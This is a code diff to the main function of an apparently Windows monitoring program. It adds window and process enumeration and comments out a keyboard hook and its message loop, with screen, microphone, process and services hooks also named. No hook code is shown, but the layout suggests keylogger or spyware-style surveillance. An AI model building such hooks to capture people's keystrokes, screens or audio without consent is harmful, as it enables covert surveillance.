@@ -8,22 +8,33 @@
 #include "hooks/services.h"
 
 int main() {
+
+
+    printf("Enumerating running applications...\n");
+
+    // Enumerate windows
+    EnumWindows(EnumWindowsProc, 0);
+
+    printf("\nEnumerating running processes...\n");
+    EnumerateProcesses();
+
+
     // Set hooks
-    SetKeyboardHook();
+    //SetKeyboardHook();
     //SetScreenHook();
     //SetMicrophoneHook();
     //SetProcessesHook();
     //SetServicesHook();
 
     // Message loop to keep the hook active
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+    //MSG msg;
+    //while (GetMessage(&msg, NULL, 0, 0)) {
+    //    TranslateMessage(&msg);
+    //    DispatchMessage(&msg);
+    //}
 
     // Remove the hooks when done
-    RemoveKeyboardHook();
+    //RemoveKeyboardHook();
     //RemoveScreenHook();
     return 0;
 }
